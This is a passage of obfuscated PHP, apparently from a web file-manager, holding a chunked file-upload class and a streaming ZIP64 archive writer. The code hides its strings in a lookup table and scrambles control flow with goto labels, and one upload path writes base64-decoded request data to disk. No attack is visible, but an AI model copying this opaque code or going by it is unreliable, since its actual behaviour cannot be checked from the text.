$ağµ­˜ïÛ = 0) { $F¸èÎ¡èÅÄ = new PathDriverStream($cÆàÍæİÙÄ, $ağµ­˜ïÛ); return $F¸èÎ¡èÅÄ->hashMd5($cÆàÍæİÙÄ); } } goto D„ŠÏÁŞÕ¢; c¬êáŞ…­“: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto A™ÚíçŒ«¹; A™ÚíçŒ«¹: $a§ğÊİ¤ =& $_SERVER[í™]; global $in; $this->in =& $in; goto aì²‘³³ÂÀ; Fö×·ÍÛ±Á: $this->checkSize(); $this->tempPathInit(); goto C­×ò™ß›Ù; aì²‘³³ÂÀ: if (!empty($_FILES)) { $fòœÚ“Õ = $_FILES[$a§ğÊİ¤[167]]; $this->uploadFile = $fòœÚ“Õ[$a§ğÊİ¤[1956]]; if (!$this->uploadFile && $fòœÚ“Õ[$a§ğÊİ¤[1205]] > 0) { show_json($this->errorInfo($fòœÚ“Õ[$a§ğÊİ¤[1205]]), !1); } } else { if (isset($in[$a§ğÊİ¤[386]])) { $this->uploadFile = isset($in[$a§ğÊİ¤[1957]]) ? $a§ğÊİ¤[1958] : $a§ğÊİ¤[1801]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto Fö×·ÍÛ±Á; C­×ò™ß›Ù: } public function upload() { goto E®ÇøƒŒíİ; F¹ğÍ†½Ğ: $cµŸìŞ³ë = $this->moveUploadedFile($dá‘ŠÆÉ•¼); if ($EõÁ¾òÃ®÷ > 0 && filesize($cµŸìŞ³ë) == 0) { $this->showJson($bñˆ®éî©Ğ[1964], !1); } if (!$cµŸìŞ³ë) { $this->showJson(LNG($bñˆ®éî©Ğ[1965]), !1); } goto C’Ô¶¯¯ß; BëŞéµ‘‡Â: $C†˜„Ö¬„’ = $this->writeTo($cµŸìŞ³ë, $B·ì‘¶ÁÂ, $this->tempFile); $Bôè¹µ•½ì = IO::hashSimple($cµŸìŞ³ë); $EõÁ¾òÃ®÷ = IO::size($cµŸìŞ³ë); goto bî•êéŸÇ­; BŒ‘ã”¹çĞ: $dá‘ŠÆÉ•¼ = $this->tempFile . $bñˆ®éî©Ğ[1961] . $C¿ÖÌ’Æ‡Ø; $EõÁ¾òÃ®÷ = isset($this->in[$bñˆ®éî©Ğ[522]]) ? intval($this->in[$bñˆ®éî©Ğ[522]]) : 0; $dÑÂĞù’„Î = isset($this->in[$bñˆ®éî©Ğ[1962]]) ? intval($this->in[$bñˆ®éî©Ğ[1962]]) : 0; goto cğÑè²¯Ì‹; E®ÇøƒŒíİ: $bñˆ®éî©Ğ =& $_SERVER[í™]; $C¿ÖÌ’Æ‡Ø = isset($this->in[$bñˆ®éî©Ğ[1959]]) ? intval($this->in[$bñˆ®éî©Ğ[1959]]) : 0; $e«òİºÌãï = isset($this->in[$bñˆ®éî©Ğ[1960]]) ? intval($this->in[$bñˆ®éî©Ğ[1960]]) : 1; goto BŒ‘ã”¹çĞ; bî•êéŸÇ­: @unlink($cµŸìŞ³ë); if (!$C†˜„Ö¬„’) { $this->showJson($bñˆ®éî©Ğ[1967] . $C¿ÖÌ’Æ‡Ø, !1); } $fÌê˜¾êŒİ[$bñˆ®éî©Ğ[1968]] = $e«òİºÌãï; goto cªÓÄ‰Á±º; C’Ô¶¯¯ß: $aêÒÚ¯ï· = $C¿ÖÌ’Æ‡Ø * $dÑÂĞù’„Î; $B·ì‘¶ÁÂ = @fopen($this->tempFile, $bñˆ®éî©Ğ[1966]); fseek($B·ì‘¶ÁÂ, $aêÒÚ¯ï·); goto BëŞéµ‘‡Â; e¿‹Ò±¿ñ×: CacheLock::lock($this->tempFile, 20); $fÌê˜¾êŒİ = $this->statusGet(); $this->initFileTemp(); goto F¹ğÍ†½Ğ; aë·£ÒĞ‹ä: CacheLock::unlock($this->tempFile); return $this->tempFile; goto FŞªëÀãò¾; cªÓÄ‰Á±º: $fÌê˜¾êŒİ[$bñˆ®éî©Ğ[1969]][$bñˆ®éî©Ğ[1970] . $C¿ÖÌ’Æ‡Ø] = array($bñˆ®éî©Ğ[1971] => $aêÒÚ¯ï·, $bñˆ®éî©Ğ[1022] => $C¿ÖÌ’Æ‡Ø, $bñˆ®éî©Ğ[77] => $EõÁ¾òÃ®÷, $bñˆ®éî©Ğ[164] => $Bôè¹µ•½ì); $this->statusSet($fÌê˜¾êŒİ); if (count($fÌê˜¾êŒİ[$bñˆ®éî©Ğ[1969]]) != $fÌê˜¾êŒİ[$bñˆ®éî©Ğ[1968]]) { $this->showJson($bñˆ®éî©Ğ[1972] . $C¿ÖÌ’Æ‡Ø, !0); } goto Eƒå‹£Ü˜â; Eƒå‹£Ü˜â: ignore_timeout(); if (!$this->checkChunkHash($fÌê˜¾êŒİ)) { $this->showJson($bñˆ®éî©Ğ[1973], !1); } $this->statusSet(!1); goto aë·£ÒĞ‹ä; cğÑè²¯Ì‹: if ($e«òİºÌãï > 1 && $dÑÂĞù’„Î <= 0) { show_json($bñˆ®éî©Ğ[1963], !1); } if ($dÑÂĞù’„Î > $EõÁ¾òÃ®÷) { $e«òİºÌãï = 1; } if ($e«òİºÌãï <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto e¿‹Ò±¿ñ×; FŞªëÀãò¾: } private function checkSize() { $F–ª°Ñ–—ˆ =& $_SERVER[í™]; if (phpBuild64() || $this->in[$F–ª°Ñ–—ˆ[77]] < PHP_INT_MAX) { return; } show_json(LNG($F–ª°Ñ–—ˆ[1974]), !1); } private function showJson($E¿ŞÖ‡î¿ƒ, $cß—¢¼ŒÅ) { CacheLock::unlock($this->tempFile); if (!$cß—¢¼ŒÅ) { return show_json($E¿ŞÖ‡î¿ƒ, $cß—¢¼ŒÅ); } show_json($E¿ŞÖ‡î¿ƒ, $cß—¢¼ŒÅ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto c¶¬ìˆ¤Ê£; C×Õ¤â°§§: touch($eÄ®…‰¡Ü­ . $cÛğø³Îôé[1975]); $B¾öè¢¶š– = isset($this->in[$cÛğø³Îôé[1976]]) ? $this->in[$cÛğø³Îôé[1976]] : !1; if (strlen($B¾öè¢¶š–) < 30) { $B¾öè¢¶š– = md5(USER_ID . $this->in[$cÛğø³Îôé[75]] . $this->fileName . $this->in[$cÛğø³Îôé[77]]); } goto D¥ ÃÓ¶çâ; c¶¬ìˆ¤Ê£: $cÛğø³Îôé =& $_SERVER[í™]; $eÄ®…‰¡Ü­ = TEMP_FILES; @mk_dir($eÄ®…‰¡Ü­); goto C×Õ¤â°§§; D¥ ÃÓ¶çâ: $this->tempFile = $eÄ®…‰¡Ü­ . $cÛğø³Îôé[1977] . md5($B¾öè¢¶š– . $this->in[$cÛğø³Îôé[1518]]); goto bº˜Ëõ‘ã; bº˜Ëõ‘ã: } private function moveUploadedFile($E‘ïÓ„¯©¼) { $aÅ¸Ú§ï‰ =& $_SERVER[í™]; $F÷®‡ĞĞäæ = $this->uploadFile; if ($F÷®‡ĞĞäæ == $aÅ¸Ú§ï‰[1978]) { @file_put_contents($E‘ïÓ„¯©¼, base64_decode($_REQUEST[$aÅ¸Ú§ï‰[1979]])); } else { if ($F÷®‡ĞĞäæ == $aÅ¸Ú§ï‰[1801]) { $EÜäõàÌ = @fopen($E‘ïÓ„¯©¼, $aÅ¸Ú§ï‰[1508]); $this->writeTo($F÷®‡ĞĞäæ, $EÜäõàÌ, $E‘ïÓ„¯©¼); } else { if (!move_uploaded_file($F÷®‡ĞĞäæ, $E‘ïÓ„¯©¼)) { return !1; } } } return $E‘ïÓ„¯©¼; } private function writeTo($AÒïğ¨ÁÉ, $cÃ»òÕá¿, $Bßğ‚¸Š– ) { goto CœšòÆ–Şä; CœšòÆ–Şä: $CÛËßèí—© =& $_SERVER[í™]; $Cß•ìÅ®·Ş = $CÛËßèí—©[1980] . $Bßğ‚¸Š– ; $CİİíÒŠĞ = CacheLock::lock($Cß•ìÅ®·Ş, 1); goto aæºàŠÏÔª; aæºàŠÏÔª: $b¬»³Áï« = @fopen($AÒïğ¨ÁÉ, $CÛËßèí—©[1507]); if (!$b¬»³Áï« || !$cÃ»òÕá¿ || !$CİİíÒŠĞ) { CacheLock::unlock($Cß•ìÅ®·Ş); return !1; } while (!feof($b¬»³Áï«)) { fwrite($cÃ»òÕá¿, fread($b¬»³Áï«, 1024 * 200)); } goto b¡‚îÙ§Å; eÃÆ¡À¨Ş: return !0; goto eŸ“×…Ø«ß; b¡‚îÙ§Å: fclose($b¬»³Áï«); fclose($cÃ»òÕá¿); CacheLock::unlock($Cß•ìÅ®·Ş); goto eÃÆ¡À¨Ş; eŸ“×…Ø«ß: } private function statusGet() { goto E˜ïÚÆø•¢; Aá£  Ë: $a¢ÇÈÉÁ‚£ = !1; if (file_exists($FîÓ”ÍˆÑÂ)) { $a¢ÇÈÉÁ‚£ = @file_get_contents($FîÓ”ÍˆÑÂ); } if ($a¢ÇÈÉÁ‚£) { $this->statusData = json_decode($a¢ÇÈÉÁ‚£, !0); } goto e®é”ÑÒâÕ; E˜ïÚÆø•¢: $F¯—ÃÕç˜ =& $_SERVER[í™]; if (is_array($this->statusData)) { return $this->statusData; } $FîÓ”ÍˆÑÂ = $this->tempFile . $F¯—ÃÕç˜[1981]; goto Aá£  Ë; e®é”ÑÒâÕ: if (!$this->statusData) { $DÕ´à°ó©¨ = array($F¯—ÃÕç˜[28] => $this->fileName, $F¯—ÃÕç˜[1968] => 0, $F¯—ÃÕç˜[1969] => array()); $this->statusSet($DÕ´à°ó©¨); } return $this->statusData; goto a¸ˆà•§¸é; a¸ˆà•§¸é: } public function statusSet($D¾…÷ÙØ÷Ù) { $b†²ù•Ğ = $this->tempFile . $_SERVER[í™][1981]; if (!$D¾…÷ÙØ÷Ù) { if (file_exists($b†²ù•Ğ)) { @unlink($b†²ù•Ğ); } return !0; } $this->statusData = $D¾…÷ÙØ÷Ù; return file_put_contents($b†²ù•Ğ, json_encode($D¾…÷ÙØ÷Ù)); } private function initFileTemp() { $F÷‡³¹ÖÕ„ =& $_SERVER[í™]; if (file_exists($this->tempFile)) { return; } $aÂö”´–› = fopen($this->tempFile, $F÷‡³¹ÖÕ„[1982]); fseek($aÂö”´–›, $this->in[$F÷‡³¹ÖÕ„[77]] - 1, SEEK_SET); fwrite($aÂö”´–›, $F÷‡³¹ÖÕ„[470]); fclose($aÂö”´–›); } public function checkChunk() { goto C¿´·×šÅ‚; C¿´·×šÅ‚: $Eİ„Å÷ğ³ =& $_SERVER[í™]; $aÉÖ¾Ô—‚‹ = array(); CacheLock::lock($this->tempFile); goto f‰´­¢¤§¹; f‰´­¢¤§¹: $b¬¤¤·›ŞŞ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($b¬¤¤·›ŞŞ[$Eİ„Å÷ğ³[1969]] as $B®•ÉĞµèŒ) { $AŒäææ§… = $B®•ÉĞµèŒ[$Eİ„Å÷ğ³[164]]; if ($AŒäææ§…) { $aÉÖ¾Ô—‚‹[$Eİ„Å÷ğ³[1983] . $B®•ÉĞµèŒ[$Eİ„Å÷ğ³[1022]]] = $AŒäææ§…; } } goto c„Ìì–Ê˜; c„Ìì–Ê˜: return $aÉÖ¾Ô—‚‹; goto eª‘¹é¹æ; eª‘¹é¹æ: } private function checkChunkHash($AŠÕø›“İŒ) { goto d°²ëÀŞÉ; d°²ëÀŞÉ: $b–ÙÓ¢Ë¸ß =& $_SERVER[í™]; if (count($AŠÕø›“İŒ[$b–ÙÓ¢Ë¸ß[1969]]) != $AŠÕø›“İŒ[$b–ÙÓ¢Ë¸ß[1968]]) { return !1; } $D®˜™ËÍÂ× = _get($this->in, $b–ÙÓ¢Ë¸ß[1976]); goto Cò‰¡—öœ; dÁß‡—ÎÎ©: $cÛÚ˜‰¿™ = !0; foreach ($AŠÕø›“İŒ[$b–ÙÓ¢Ë¸ß[1969]] as $bî²¢âçÆ) { fseek($E©ÍÁ÷“šÄ, $bî²¢âçÆ[$b–ÙÓ¢Ë¸ß[1971]]); $bÏÂ˜¨š© = PathDriverStream::hash($E©ÍÁ÷“šÄ, $bî²¢âçÆ[$b–ÙÓ¢Ë¸ß[77]]); if ($bî²¢âçÆ[$b–ÙÓ¢Ë¸ß[164]] != $bÏÂ˜¨š©) { $cÛÚ˜‰¿™ = !1; break; } } fclose($E©ÍÁ÷“šÄ); goto c˜•‹èØè‡; Cò‰¡—öœ: $D±–ÍÚù…ö = _get($this->in, $b–ÙÓ¢Ë¸ß[1984]); if (strlen($D±–ÍÚù…ö) == 32 && IO::hashSimple($this->tempFile) == $D®˜™ËÍÂ× && IO::hashMd5($this->tempFile) == $D±–ÍÚù…ö) { return !0; } $E©ÍÁ÷“šÄ = fopen($this->tempFile, $b–ÙÓ¢Ë¸ß[1156]); goto dÁß‡—ÎÎ©; c˜•‹èØè‡: return $cÛÚ˜‰¿™; goto d×Ë¼«…„¸; d×Ë¼«…„¸: } public static function fileName() { goto eÉ÷º—§‡¦; eÉ÷º—§‡¦: $F¶°èŒœÆ =& $_SERVER[í™]; global $in; $a½ØÒ‡®¼¿ = isset($in[$F¶°èŒœÆ[28]]) ? $in[$F¶°èŒœÆ[28]] : $F¶°èŒœÆ[33]; goto dŞœ†Â«ó; Cô² ²ã¶»: $Bç‹¾áÃ» = $Bç‹¾áÃ» ? $Bç‹¾áÃ» : time(); $fÕÈÚò¨×” = strtolower($a½ØÒ‡®¼¿); if ($fÕÈÚò¨×” == $F¶°èŒœÆ[1986] || $fÕÈÚò¨×” == $F¶°èŒœÆ[1987]) { $a½ØÒ‡®¼¿ = date($F¶°èŒœÆ[672], $Bç‹¾áÃ») . $F¶°èŒœÆ[70] . $in[$F¶°èŒœÆ[77]] . $F¶°èŒœÆ[1615]; } else { if ($fÕÈÚò¨×” == $F¶°èŒœÆ[1988]) { $a½ØÒ‡®¼¿ = date($F¶°èŒœÆ[672], $Bç‹¾áÃ») . $F¶°èŒœÆ[70] . $in[$F¶°èŒœÆ[77]] . $F¶°èŒœÆ[1989]; } } goto Aµ—î˜Ùæ; Aµ—î˜Ùæ: return KodIO::clear($a½ØÒ‡®¼¿); goto aÙŠŞğäÅË; dŞœ†Â«ó: if (!empty($_FILES)) { $a½ØÒ‡®¼¿ = $a½ØÒ‡®¼¿ ? $a½ØÒ‡®¼¿ : $_FILES[$F¶°èŒœÆ[167]][$F¶°èŒœÆ[386]]; } if (!is_wap()) { return KodIO::clear($a½ØÒ‡®¼¿); } $Bç‹¾áÃ» = strtotime($in[$F¶°èŒœÆ[1985]]); goto Cô² ²ã¶»; aÙŠŞğäÅË: } private function errorInfo($Dè¢¦ÀÀä³) { $BŠ½Ÿ­¨Áé =& $_SERVER[í™]; $c¬ß¶˜Œâ = array($BŠ½Ÿ­¨Áé[1990], $BŠ½Ÿ­¨Áé[1991], $BŠ½Ÿ­¨Áé[1992], $BŠ½Ÿ­¨Áé[1993], $BŠ½Ÿ­¨Áé[1994], $BŠ½Ÿ­¨Áé[1995], $BŠ½Ÿ­¨Áé[1996], $BŠ½Ÿ­¨Áé[1997]); return $Dè¢¦ÀÀä³ . $BŠ½Ÿ­¨Áé[4] . $c¬ß¶˜Œâ[$Dè¢¦ÀÀä³]; } } class ZipMake { const VERSION = "\x30\56\x32\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($FÃ•ìè¦º« = null) { $e§ß…Ø·Ç· =& $_SERVER[í™]; $this->outputStream = fopen($e§ß…Ø·Ç·[1998], $e§ß…Ø·Ç·[1212]); $this->outputName = $FÃ•ìè¦º«; $this->needHeaders = !0; } public function addFile($CËšõçæ¥Ÿ, $Bó Ü†³ˆ—) { goto d½Œ–§ ï; B¨ŸâùË½: $Cª‘ÌÎ½õÚ = $this->addFileHeader($CËšõçæ¥Ÿ, $D“ÆÖÀÙŒ); $f·™ŞæÎ¥‚ = $BÅå¯²˜ = filesize($Bó Ü†³ˆ—); $BÓá††¥ Î = fopen($Bó Ü†³ˆ—, $dˆÈ‘‹ğ×…[1999]); goto FÀ­¯Ò›º®; d½Œ–§ ï: $dˆÈ‘‹ğ×… =& $_SERVER[í™]; $CËšõçæ¥Ÿ = $this->filterFilename($CËšõçæ¥Ÿ); $D“ÆÖÀÙŒ = static::METHOD_STORE; goto B¨ŸâùË½; FÀ­¯Ò›º®: while (!feof($BÓá††¥ Î)) { $fªğ™ÛËº = fread($BÓá††¥ Î, 1048576); $this->send($fªğ™ÛËº); } fclose($BÓá††¥ Î); $EÙÜ¼±òÈï = hexdec(hash_file($dˆÈ‘‹ğ×…[2000], $Bó Ü†³ˆ—)); goto eËœÔ¼Ñ¼Ã; eËœÔ¼Ñ¼Ã: $this->addFileFooter($CËšõçæ¥Ÿ, $D“ÆÖÀÙŒ, $EÙÜ¼±òÈï, $f·™ŞæÎ¥‚, $BÅå¯²˜, $Cª‘ÌÎ½õÚ); goto Cá–‹ô˜‰—; Cá–‹ô˜‰—: } public function addFileFromStream($EšæÄ¹›ĞÒ, $DÎÎÅŠÂ½è) { goto eƒ½¶”İÀ; DÂï¬²–: fseek($DÎÎÅŠÂ½è, 0, SEEK_END); $fÎ§“šÇÁç = $AµËõñ§¾ = ftell($DÎÎÅŠÂ½è); rewind($DÎÎÅŠÂ½è); goto d”Àîáô¯Î; eƒ½¶”İÀ: $EšæÄ¹›ĞÒ = $this->filterFilename($EšæÄ¹›ĞÒ); $A‡Ñ›ä’ = static::METHOD_STORE; $AĞË°½–ã = $this->addFileHeader($EšæÄ¹›ĞÒ, $A‡Ñ›ä’); goto DÂï¬²–; d”Àîáô¯Î: $DĞÎ®¿º» = hash_init($_SERVER[í™][2000]); while (!feof($DÎÎÅŠÂ½è)) { $F›¤ÌîóÛ = fread($DÎÎÅŠÂ½è, 1048576); hash_update($DĞÎ®¿º», $F›¤ÌîóÛ); $this->send($F›¤ÌîóÛ); } $d×‹½µøƒÏ = hexdec(hash_final($DĞÎ®¿º»)); goto f˜ñ™÷Çì‚; f˜ñ™÷Çì‚: $this->addFileFooter($EšæÄ¹›ĞÒ, $A‡Ñ›ä’, $d×‹½µøƒÏ, $fÎ§“šÇÁç, $AµËõñ§¾, $AĞË°½–ã); goto E¦İõ·¥Ü; E¦İõ·¥Ü: } public function finish() { foreach ($this->files as $CÚç‡£Á Ğ) { $this->addCdrFile($CÚç‡£Á Ğ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($e‡É©¸×²˜, $fœ¿ÅÈö) { goto dªÍºÅÊÔ; DŸñµØó³Ë: $DĞ°ÔÓ»§Ô = $this->packFields($B´ˆ±„İä); $AÇ»­ƒÛåï = $this->packFields($bÒÒÄ—’‚ñ); $this->send($DĞ°ÔÓ»§Ô . $e‡É©¸×²˜ . $AÇ»­ƒÛåï); goto B”Ö¬åÎÉ°; CîÑÃä¶ŠÓ: $B‘•çË»¦Å = $this->dosTime(time()); $B´ˆ±„İä = array(array($cìªâ¦Îİî[2002], static::FILE_HEADER_SIGNATURE), array($cìªâ¦Îİî[2003], static::ZIP_VERSION_64), array($cìªâ¦Îİî[2003], 8), array($cìªâ¦Îİî[2003], $fœ¿ÅÈö), array($cìªâ¦Îİî[2002], $B‘•çË»¦Å), array($cìªâ¦Îİî[2002], 0), array($cìªâ¦Îİî[2002], 4294967295), array($cìªâ¦Îİî[2002], 4294967295), array($cìªâ¦Îİî[2003], $B—Å™ô™ì»), array($cìªâ¦Îİî[2003], 32)); $bÒÒÄ—’‚ñ = array(array($cìªâ¦Îİî[2003], 1), array($cìªâ¦Îİî[2003], 28), array($cìªâ¦Îİî[2004], 0), array($cìªâ¦Îİî[2004], 0), array($cìªâ¦Îİî[2004], 0), array($cìªâ¦Îİî[2002], 0)); goto DŸñµØó³Ë; dªÍºÅÊÔ: $cìªâ¦Îİî =& $_SERVER[í™]; $e‡É©¸×²˜ = preg_replace($cìªâ¦Îİî[2001], $cìªâ¦Îİî[33], $e‡É©¸×²˜); $B—Å™ô™ì» = strlen($e‡É©¸×²˜); goto CîÑÃä¶ŠÓ; B”Ö¬åÎÉ°: return strlen($DĞ°ÔÓ»§Ô) + $B—Å™ô™ì» + strlen($AÇ»­ƒÛåï); goto A÷ê¢ÜÜóå; A÷ê¢ÜÜóå: } protected function addFileFooter($aãÊ•‚Ô›â, $FÌ‹„Âğ–â, $dğ©¡¨˜², $D’§Ä²ˆ», $BŞø»Ñ««™, $Dù³ÄÆâ) { $BŠ±…Œ·äÇ =& $_SERVER[í™]; $BÚ„›Ø‰¨Ï = array(array($BŠ±…Œ·äÇ[2002], static::DATA_DESCRIPTOR_SIGNATURE), array($BŠ±…Œ·äÇ[2002], $dğ©¡¨˜²), array($BŠ±…Œ·äÇ[2004], $D’§Ä²ˆ»), array($BŠ±…Œ·äÇ[2004], $BŞø»Ñ««™)); $f£¸¾œÍğ” = $this->packFields($BÚ„›Ø‰¨Ï); $this->send($f£¸¾œÍğ”); $dÜ™»í´¨ = $Dù³ÄÆâ + $D’§Ä²ˆ» + $B‘Ä¢ˆ±áì; $this->addToCdr($aãÊ•‚Ô›â, $FÌ‹„Âğ–â, $dğ©¡¨˜², $D’§Ä²ˆ», $BŞø»Ñ««™, $dÜ™»í´¨); } private function addToCdr($b˜İ¶Ô—®Ï, $a®­”¬¥Æ, $dšî¡è–·ù, $d•ä¾øéí, $bø‚ùàğŠ, $eíùœ¾îŞ) { $this->files[] = array($b˜İ¶Ô—®Ï, $a®­”¬¥Æ, $dšî¡è–·ù, $d•ä¾øéí, $bø‚ùàğŠ, $this->ofs); $this->ofs += $eíùœ¾îŞ; } protected function addCdrFile($E“ä»ß²) { goto c’¬Óˆ³õÄ; c’ë”œ: $EÏÊ½Ä‚Ø = $this->packFields($cÏŠ‚Î´…); $C™øã‹šâ = $this->packFields($BÃÛø¡à¯); $añ´Š´µø = $EÏÊ½Ä‚Ø . $a‡ƒ†¥Û¦ƒ . $B£ÓÖÁà¢µ . $C™øã‹šâ; goto aÛ¦ÅÕø†È; Eù«íÀÁ¿³: $E¸ˆÓÊœ‹ = $this->dosTime(time()); $cÏŠ‚Î´… = array(array($dîâ…«ãÀñ[2002], static::CDR_FILE_SIGNATURE), array($dîâ…«ãÀñ[2003], static::ZIP_VERSION_64), array($dîâ…«ãÀñ[2003], static::ZIP_VERSION_64), array($dîâ…«ãÀñ[2003], 8), array($dîâ…«ãÀñ[2003], $cõë½ÑŒÓ¼), array($dîâ…«ãÀñ[2002], $E¸ˆÓÊœ‹), array($dîâ…«ãÀñ[2002], $CÇ¶ñš¸šŒ), array($dîâ…«ãÀñ[2002], 4294967295), array($dîâ…«ãÀñ[2002], 4294967295), array($dîâ…«ãÀñ[2003], strlen($a‡ƒ†¥Û¦ƒ)), array($dîâ…«ãÀñ[2003], 32), array($dîâ…«ãÀñ[2003], strlen($B£ÓÖÁà¢µ)), array($dîâ…«ãÀñ[2003], 0), array($dîâ…«ãÀñ[2003], 0), array($dîâ…«ãÀñ[2002], 32), array($dîâ…«ãÀñ[2002], 4294967295)); $BÃÛø¡à¯ = array(array($dîâ…«ãÀñ[2003], 1), array($dîâ…«ãÀñ[2003], 28), array($dîâ…«ãÀñ[2004], $cËœ¿åµÊ¹), array($dîâ…«ãÀñ[2004], $eÁÕ©â†º¿), array($dîâ…«ãÀñ[2004], $FŠ’–¥Ç¸à), array($dîâ…«ãÀñ[2002], 0)); goto c’ë”œ; c’¬Óˆ³õÄ: $dîâ…«ãÀñ =& $_SERVER[í™]; list($a‡ƒ†¥Û¦ƒ, $cõë½ÑŒÓ¼, $CÇ¶ñš¸šŒ, $eÁÕ©â†º¿, $cËœ¿åµÊ¹, $FŠ’–¥Ç¸à) = $E“ä»ß²; $B£ÓÖÁà¢µ = $dîâ…«ãÀñ[33]; goto Eù«íÀÁ¿³; aÛ¦ÅÕø†È: $this->send($añ´Š´µø); $this->cdr_ofs += strlen($añ´Š´µø); goto d²ˆîº¶’õ; d²ˆîº¶’õ: } protected function addCdr64Eof() { goto DŒÖÄ°ò×õ; cÖ³·ÚíÛ: $this->send($e¥åÈŠ‡¬‰); goto a”È…”Ö‹; F”óÆŞÈ™: $b—‚’µ = $this->ofs; $AñŠ”ñß = array(array($a· Õ¾ŠÓ[2002], static::ZIP64_CDR_EOF_SIGNATURE), array($a· Õ¾ŠÓ[2004], 44), array($a· Õ¾ŠÓ[2003], static::ZIP_VERSION_64), array($a· Õ¾ŠÓ[2003], static::ZIP_VERSION_64), array($a· Õ¾ŠÓ[2002], 0), array($a· Õ¾ŠÓ[2002], 0), array($a· Õ¾ŠÓ[2004], $fÅ„‰“´È), array($a· Õ¾ŠÓ[2004], $fÅ„‰“´È), array($a· Õ¾ŠÓ[2004], $d¿”ŠéË„à), array($a· Õ¾ŠÓ[2004], $b—‚’µ)); $e¥åÈŠ‡¬‰ = $this->packFields($AñŠ”ñß); goto cÖ³·ÚíÛ; DŒÖÄ°ò×õ: $a· Õ¾ŠÓ =& $_SERVER[í™]; $fÅ„‰“´È = count($this->files); $d¿”ŠéË„à = $this->cdr_ofs; goto F”óÆŞÈ™; a”È…”Ö‹: } protected function addCdr64Locator() { goto Eôã‘–Ÿù; Eñ«ù‰ñï: $d™©´¯¶‘¸ = $this->ofs; $C°¾Ìë¨ß… = array(array($BÎ¥î¤«•[2002], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($BÎ¥î¤«•[2002], 0), array($BÎ¥î¤«•[2004], $d™©´¯¶‘¸ + $FŞ›‡óëÆ×), array($BÎ¥î¤«•[2002], 1)); $bÈÒöÑÇ–Ã = $this->packFields($C°¾Ìë¨ß…); goto CìÁÕ·œĞİ; Eôã‘–Ÿù: $BÎ¥î¤«• =& $_SERVER[í™]; $cºéšãêÜ© = count($this->files); $FŞ›‡óëÆ× = $this->cdr_ofs; goto Eñ«ù‰ñï; CìÁÕ·œĞİ: $this->send($bÈÒöÑÇ–Ã); goto bº‡œïšï©; bº‡œïšï©: } protected function addCdrEof() { goto d÷‹ã’•Á; d÷‹ã’•Á: $DÈ·ƒ¬÷Şí =& $_SERVER[í™]; $FØ…Ë¥ô£µ = count($this->files); $eøÒâ·–ó = $this->cdr_ofs; goto dç£ù¸Øƒ; A÷ËªÌÄŠÂ: $d­ßÎÍ—Ÿ¸ = $this->packFields($Aä½ƒ—ÒÃÙ) . $dÚÚªÁ„Ú; $this->send($d­ßÎÍ—Ÿ¸); goto bâ¬–†Àì; dç£ù¸Øƒ: $A¡ğ†·ƒ = $this->ofs; $dÚÚªÁ„Ú = $DÈ·ƒ¬÷Şí[33]; $Aä½ƒ—ÒÃÙ = array(array($DÈ·ƒ¬÷Şí[2002], static::CDR_EOF_SIGNATURE), array($DÈ·ƒ¬÷Şí[2003], 0), array($DÈ·ƒ¬÷Şí[2003], 0), array($DÈ·ƒ¬÷Şí[2003], $FØ…Ë¥ô£µ), array($DÈ·ƒ¬÷Şí[2003], $FØ…Ë¥ô£µ), array($DÈ·ƒ¬÷Şí[2002], 4294967295), array($DÈ·ƒ¬÷Şí[2002], 4294967295), array($DÈ·ƒ¬÷Şí[2003], strlen($dÚÚªÁ„Ú))); goto A÷ËªÌÄŠÂ; bâ¬–†Àì: } protected function addCdr() { foreach ($this->files as $DŸğáÛ²‡Ç) { $this->addCdrFile($DŸğáÛ²‡Ç); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $Bµà£©–çÍ =& $_SERVER[í™]; $c˜í“íÚ¸¥ = $Bµà£©–çÍ[202]; if ($this->outputName) { $A´ßÃèÄ… = trim(str_replace(array($Bµà£©–çÍ[113], $Bµà£©–çÍ[55], $Bµà£©–çÍ[93], $Bµà£©–çÍ[67], $Bµà£©–çÍ[217], $Bµà£©–çÍ[978]), $Bµà£©–çÍ[33], $this->outputName)); $Eãø‡ïø‚Ñ = rawurlencode($A´ßÃèÄ…); $c˜í“íÚ¸¥ .= "\73\40\x66\151\x6c\x65\156\x61\x6d\145\x2a\x3d\165\x74\x66\x2d\x38\x27\x27{$Eãø‡ïø‚Ñ}"; } $D‹¨»¬šäì = array($Bµà£©–çÍ[199] => $Bµà£©–çÍ[2005], $Bµà£©–çÍ[2006] => $c˜í“íÚ¸¥, $Bµà£©–çÍ[2007] => $Bµà£©–çÍ[2008], $Bµà£©–çÍ[2009] => $Bµà£©–çÍ[2010], $Bµà£©–çÍ[2011] => $Bµà£©–çÍ[2012]); foreach ($D‹¨»¬šäì as $C‰Ò²¦æ‘í => $f¸ĞŠŒ™¸…) { header($C‰Ò²¦æ‘í . $Bµà£©–çÍ[865] . $f¸ĞŠŒ™¸…); } } protected function send($C‹®‚öÌİ’) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $C‹®‚öÌİ’); } protected final function dosTime($Aƒ´—æøÂÜ) { $Fâ±ŠäÒğ =& $_SERVER[í™]; $b¡¨‘Œá¿ = getdate($Aƒ´—æøÂÜ); if ($b¡¨‘Œá¿[$Fâ±ŠäÒğ[1712]] < 1980) { $b¡¨‘Œá¿ = array($Fâ±ŠäÒğ[1712] => 1980, $Fâ±ŠäÒğ[2013] => 1, $Fâ±ŠäÒğ[2014] => 1, 